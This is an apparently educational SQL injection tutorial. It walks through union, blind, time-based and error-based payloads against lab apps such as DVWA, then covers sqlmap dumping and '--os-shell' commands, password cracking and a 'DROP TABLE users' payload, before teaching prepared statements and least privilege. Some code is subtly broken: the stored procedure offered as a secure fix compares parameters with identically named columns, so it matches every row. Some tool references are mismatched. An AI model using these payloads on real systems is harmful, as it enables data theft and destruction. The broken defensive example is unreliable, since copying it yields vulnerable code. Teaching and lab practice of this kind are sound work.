# SQL Injection Basics and Prevention

> [!info] Tutorial Information
> **Category:** Web Application Security
> **Difficulty:** Intermediate
> **Prerequisites:** Basic SQL knowledge, understanding of web applications
> **Estimated Time:** 2 hours

## 📋 Table of Contents

- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Step-by-Step Guide](#step-by-step-guide)
- [Best Practices](#best-practices)
- [Common Mistakes](#common-mistakes)
- [Troubleshooting](#troubleshooting)
- [Conclusion](#conclusion)

## Introduction

SQL Injection (SQLi) is one of the oldest and most dangerous web application vulnerabilities. It occurs when user input is improperly sanitized and directly concatenated into SQL queries, allowing attackers to manipulate database operations, extract sensitive data, and even execute administrative operations.

This tutorial provides hands-on examples of SQL injection attacks and teaches defensive coding techniques to prevent them.

### What You'll Learn

By the end of this tutorial, you'll be able to:

- Understand how SQL injection vulnerabilities arise
- Identify and exploit basic SQL injection flaws
- Recognize different types of SQL injection attacks
- Implement parameterized queries (prepared statements)
- Use stored procedures and input validation
- Detect and prevent SQL injection in your applications
- Test applications for SQL injection vulnerabilities

### Use Cases

- Web application security testing
- Secure coding practices
- Code review and vulnerability assessment
- Incident response for database breaches
- DevSecOps integration

## Prerequisites

> [!warning] Important
> Before starting this tutorial, ensure you have the following:

### Knowledge Prerequisites

- Basic understanding of SQL syntax (SELECT, INSERT, UPDATE, DELETE)
- Familiarity with web applications and HTTP requests
- Understanding of server-side programming (PHP, Java, Python, etc.)
- Knowledge of relational databases (MySQL, PostgreSQL, SQL Server)

### Tool Prerequisites

> [!tip] Required Tools
> - [SQLi-Lab](https://github.com/sunnyneharekar/sqlivuln) (vulnerable web application)
> - [Burp Suite Community](https://portswigger.net/burp/communitydownload)
> - [SQLMap](https://sqlmap.org/) (automated SQLi testing)
> - [DVWA](https://github.com/digininja/DVWA) (Damn Vulnerable Web App)
> - Database client (MySQL, PostgreSQL, or SQLite)

### System Prerequisites

- Web server (Apache/Nginx) with PHP support
- Database server (MySQL 5.7+ or equivalent)
- Browser with developer tools
- Terminal access for running tools

## Step-by-Step Guide

### Step 1: Understanding SQL Injection

SQL injection occurs when an attacker can insert malicious SQL code into application queries through user input.

**Vulnerable Code Pattern:**
```php
<?php
// Vulnerable: Direct concatenation
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);
?>
```

**Attack Example:**
```
Username: admin' --
Password: anything
```

This transforms the query into:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

The `--` comments out the password check!

### Step 2: Setting Up a Test Environment

**Using Docker (Recommended):**
```bash
# Pull SQLi-Lab docker image
docker pull ismisepaul/securityshepherd

# Or install manually
git clone https://github.com/sunnyneharekar/sqlivuln.git
cd sqlivuln
./install.sh

# Start Apache and MySQL
sudo systemctl start apache2
sudo systemctl start mysql
```

**DVWA Setup:**
```bash
# Install DVWA
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
chmod -R 755 /var/www/html/dvwa

# Configure database
mysql -u root -p
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
```

### Step 3: Basic SQL Injection Types

#### Type 1: Union-Based SQL Injection

The most common type, allowing data extraction using UNION SELECT.

```php
// Vulnerable search query
$search = $_GET['search'];
$query = "SELECT * FROM products WHERE name LIKE '%$search%'";
```

**Exploitation Steps:**

1. **Identify column count:**
```bash
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# Keep going until you get an error
```

2. **Extract data using UNION:**
```bash
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT null,username,password FROM users--
```

3. **Database enumeration:**
```bash
' UNION SELECT version(),user(),database()--
' UNION SELECT table_name,column_name,1 FROM information_schema.columns WHERE table_schema='dvwa'--
```

#### Type 2: Boolean-Based Blind SQL Injection

When there's no visible output, use true/false conditions.

```php
// No output displayed, only True/False results
$query = "SELECT * FROM users WHERE id='$id'";
$result = mysqli_query($connection, $query);
if(mysqli_num_rows($result) > 0) {
    echo "User exists";
}
```

**Exploitation:**
```bash
# True condition (user exists)
id=1 AND 1=1

# False condition (user doesn't exist)
id=1 AND 1=2

# Extract data character by character
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'
```

**Automated with SQLMap:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --crawl=2
```

#### Type 3: Time-Based Blind SQL Injection

When there's no output, use time delays to infer information.

```php
// Different response times for true/false
$query = "SELECT * FROM users WHERE username='$username'";
```

**Exploitation:**
```bash
# Force delay if condition is true
id=1 AND IF(1=1,SLEEP(5),0)

# Extract data using delays
id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)
```

#### Type 4: Error-Based SQL Injection

Force database to reveal information through error messages.

```php
// Error messages revealed
$query = "SELECT * FROM users WHERE id=$id";
```

**Exploitation:**
```bash
# MySQL error-based
id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))

# PostgreSQL error-based
id=1 AND (SELECT CAST(password AS numeric) FROM users LIMIT 1)=1
```

### Step 4: Manual Exploitation Example

Let's exploit DVWA SQL Injection (Medium level):

1. **Send request to Burp Repeater:**
```
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
Host: localhost
Cookie: security=medium; PHPSESSID=abc123

id=1&Submit=Submit
```

2. **Test for injection:**
```
id=1'&Submit=Submit
# Expected: SQL error (or no result)
```

3. **Identify column count:**
```
id=1' ORDER BY 2-- &Submit=Submit
id=1' ORDER BY 3-- &Submit=Submit
# When you get error, you've found the column count
```

4. **Extract database information:**
```
id=1' UNION SELECT 1,2-- &Submit=Submit
id=1' UNION SELECT user(),database(),version()-- &Submit=Submit
```

5. **Extract users table:**
```
id=1' UNION SELECT user,password FROM users-- &Submit=Submit
```

6. **Crack passwords:**
```bash
# Using hashcat or john the ripper
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
john hash.txt
```

### Step 5: Automated Exploitation with SQLMap

**Basic scan:**
```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=abc"
```

**Comprehensive scan:**
```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/" \
       --data="id=1&Submit=Submit" \
       --cookie="security=medium; PHPSESSID=abc" \
       --batch \
       --crawl=3 \
       --level=5 \
       --risk=3 \
       --threads=3 \
       --dbms=mysql
```

**Extract data:**
```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/" \
       --data="id=1&Submit=Submit" \
       --cookie="security=medium; PHPSESSID=abc" \
       --tables \
       --columns \
       --dump
```

**OS Shell access:**
```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/" \
       --data="id=1&Submit=Submit" \
       --cookie="security=medium; PHPSESSID=abc" \
       --os-shell
```

### Step 6: SQL Injection in Different Contexts

#### Insert Statements

```php
// Vulnerable registration
$username = $_POST['username'];
$email = $_POST['email'];
$query = "INSERT INTO users (username, email) VALUES ('$username', '$email')";
```

**Exploitation:**
```sql
username: admin', 'admin@evil.com'), ('hacker', 'hacker@evil.com')--
```

#### Update Statements

```php
// Vulnerable profile update
$name = $_POST['name'];
$query = "UPDATE users SET name='$name' WHERE id=1";
```

**Exploitation:**
```sql
name: John', role='admin' WHERE id=1--
```

#### Delete Statements

```php
// Vulnerable comment deletion
$id = $_GET['id'];
$query = "DELETE FROM comments WHERE id=$id";
```

**Exploitation:**
```sql
id=1; DROP TABLE users--
```

### Step 7: Prevention Techniques

#### Method 1: Prepared Statements (Parameterized Queries)

**PHP with PDO:**
```php
<?php
// Secure approach
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$result = $stmt->fetch();
?>
```

**Python with SQLite:**
```python
# Secure approach
username = request.form['username']
password = request.form['password']

cursor = db.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
)
```

**Java with PreparedStatement:**
```java
// Secure approach
String username = request.getParameter("username");
String password = request.getParameter("password");

String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pst = connection.prepareStatement(query);
pst.setString(1, username);
pst.setString(2, password);
ResultSet rs = pst.executeQuery();
```

#### Method 2: Stored Procedures

```sql
-- Create stored procedure
DELIMITER //
CREATE PROCEDURE GetUser(IN username VARCHAR(50), IN password VARCHAR(50))
BEGIN
    SELECT * FROM users WHERE username = username AND password = password;
END //
DELIMITER ;
```

```php
// Call stored procedure
$stmt = $pdo->prepare("CALL GetUser(?, ?)");
$stmt->execute([$username, $password]);
```

#### Method 3: Input Validation

```php
<?php
// Whitelist validation
function validateUsername($username) {
    // Only allow alphanumeric and underscores, 3-20 characters
    if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
        die("Invalid username format");
    }
    return $username;
}

$username = validateUsername($_POST['username']);

// Additional escaping (not sufficient alone)
$username = mysqli_real_escape_string($connection, $username);
?>
```

#### Method 4: Escaping (Least Preferred)

```php
<?php
// Only use as secondary defense
$username = mysqli_real_escape_string($connection, $_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username'";
?>
```

### Step 8: Advanced Prevention Techniques

#### Principle of Least Privilege

```sql
-- Create limited database user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strongpassword';
GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp'@'localhost';
-- No DROP, ALTER, or file operations
```

#### Web Application Firewall (WAF)

```apache
# ModSecurity rule example
SecRule REQUEST_URI "@detectSQLi" \
  "id:1000,\
  phase:2,\
  deny,\
  msg:'SQL Injection Attack Detected'"
```

#### Database Activity Monitoring

```sql
-- Enable query logging
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/mysql.log';
```

### Step 9: Testing for SQL Injection

**Manual Testing Checklist:**

1. Test all input fields (GET, POST, headers, cookies)
2. Test special characters: `' " ; ) -- /* */ @@
3. Test different SQL keywords: UNION, SELECT, INSERT, DROP
4. Test time-based attacks: SLEEP(), WAITFOR DELAY
5. Test boolean conditions: AND 1=1, OR 1=1
6. Test for error-based injection

**Automated Testing:**

```bash
# SQLMap scan
sqlmap -u "http://target.com/page.php?param=value" --batch

# Burp Suite Scanner
# Enable active scanner for SQLi vulnerabilities

# OWASP ZAP
# Scan for SQL injection vulnerabilities
```

**Code Review Checklist:**

✓ Are queries using prepared statements?
✓ Is input being validated?
✓ Are error messages sanitized?
✓ Is least privilege enforced?
✓ Is sensitive data encrypted?
✓ Are logs being monitored?

## Best Practices

> [!success] Best Practices
> Follow these best practices to prevent SQL injection:

1. **Always Use Prepared Statements**
   - Never concatenate user input into SQL queries
   - Use parameterized queries for all dynamic SQL
   - Pass user input as parameters, not as part of the query string

2. **Validate and Sanitize Input**
   - Use whitelist validation (allow only expected characters)
   - Apply input filters for special characters
   - Reject invalid input, don't try to "fix" it

3. **Implement Defense in Depth**
   - Use prepared statements as primary defense
   - Add input validation as secondary layer
   - Use least privilege for database users
   - Implement WAF for additional protection

4. **Error Handling**
   - Never display database errors to users
   - Log errors securely on the server
   - Return generic error messages to clients

5. **Regular Testing**
   - Include SQLi tests in security assessments
   - Use automated scanning tools regularly
   - Perform code reviews focusing on database queries

## Common Mistakes

> [!danger] Common Mistakes to Avoid

### Mistake 1: Using String Concatenation

**Incorrect:**
```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
```

**Correct:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
```

### Mistake 2: Relying Only on Input Escaping

**Explanation:**
Escaping is not sufficient as the primary defense because:
- Different contexts need different escaping rules
- Escaping can be bypassed with encoding
- Prepared statements are more reliable

**Correct Approach:**
```php
// Use prepared statements + validation
if (validateInput($_POST['username'])) {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$_POST['username']]);
}
```

### Mistake 3: Over-Permissive Database Users

**Explanation:**
If the web application user has excessive privileges, a successful SQL injection can lead to database destruction or data theft.

**Correct Approach:**
```sql
-- Create least privilege user
CREATE USER 'webapp'@'localhost';
GRANT SELECT, INSERT, UPDATE ON webapp_db.users TO 'webapp'@'localhost';
-- NO DROP, ALTER, FILE, SUPER privileges
```

## Troubleshooting

> [!question] Frequently Asked Questions

### Q: What's the difference between parameterized queries and prepared statements?

**A:** They are the same thing. "Prepared statement" is the SQL term, and "parameterized query" is the programming term for the same concept.

### Q: Can I use stored procedures instead of prepared statements?

**A:** Yes, but with caveats:
- Input validation is still needed
- Dynamic SQL in stored procedures is still vulnerable
- Ensure stored procedures themselves don't use dynamic SQL

### Q: Do ORMs (Object-Relational Mappers) prevent SQL injection?

**A:** Mostly yes, if used correctly:
- Most ORMs use prepared statements automatically
- Still vulnerable if using raw queries or string concatenation
- Be careful with `raw()` methods or query builders

### Q: What about NoSQL databases?

**A:** NoSQL databases have different injection risks:
- MongoDB: Operator injection ($ne, $where, etc.)
- Still need input validation and parameterized queries
- Each database has specific injection techniques

## Hands-On Exercise

> [!example] Practice Exercise
> Practice finding and fixing SQL injection vulnerabilities:

### Exercise Setup

1. **Install DVWA:**
```bash
git clone https://github.com/digininja/DVWA.git
```

2. **Configure database:**
```bash
mysql -u root -p
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';
```

### Exercise Tasks

**Task 1: Detection**
- Use Burp Suite to find SQL injection in DVWA
- Classify the type of SQL injection found

**Task 2: Exploitation**
- Extract database version and user
- List all tables in the database
- Extract usernames and passwords from users table

**Task 3: Prevention**
- Fix the vulnerable code using prepared statements
- Add input validation
- Test that the fix works

### Expected Results

```bash
# SQLMap output example
[INFO] testing connection to the target URL
[INFO] testing if the target is protected by WAF/IPS
[INFO] testing if parameter 'id' is dynamic
[INFO] parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that parameter 'id' might be injectable
[INFO] testing for SQL injection on parameter 'id'
[INFO] testing UNION query (information_schema) on parameter 'id'
[INFO] parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] testing MySQL >= 5.0 boolean-based blind - Parameter replace
[INFO] parameter 'id' is 'MySQL >= 5.0 boolean-based blind - Parameter replace (original query)' injectable

[INFO] testing MySQL >= 5.0 UNION query (information_schema) - WHERE or HAVING clause
[INFO] parameter 'id' is 'MySQL >= 5.0 UNION query (information_schema) - WHERE or HAVING clause' injectable

Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 8735=8735 AND 'x'='x&Submit=Submit
    Type: UNION query
    Title: MySQL >= 5.0 UNION query (information_schema) - WHERE or HAVING clause
    Payload: id=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787671,0x615a5370454e6f68497977,0x7176626271),NULL-- x&Submit=Submit
```

## Conclusion

SQL injection remains a critical vulnerability in web applications. Understanding both attack and defense techniques is essential for security professionals.

### Next Steps

1. Practice on **Hack The Box** machines (Lame, Legacy, Blue)
2. Study **NoSQL injection** techniques (MongoDB, CouchDB)
3. Learn about **second-order SQL injection** (stored and executed later)
4. Explore **LDAP injection** and **XML injection**
5. Integrate security testing into **CI/CD pipelines**

### Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Academy](https://portswigger.net/web-security/sql-injection)
- [SQLMap User Manual](https://sqlmap.org/usage.html)
- [Database Security Best Practices](https://www.sans.org/white-papers/3142/)
- [CWE-89: Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/89.html)

### Key Takeaways

- SQL injection is still one of the most critical web vulnerabilities
- Prepared statements are the most effective defense
- Never trust user input, always validate and sanitize
- Use least privilege for database accounts
- Test regularly with both manual and automated techniques

### Tags

{{tool "sql injection"}} {{tool "secure coding"}} {{tool "database security"}} {{tool "penetration testing"}} {{tool "owasp"}}


*Happy learning! Stay curious and keep practicing.*
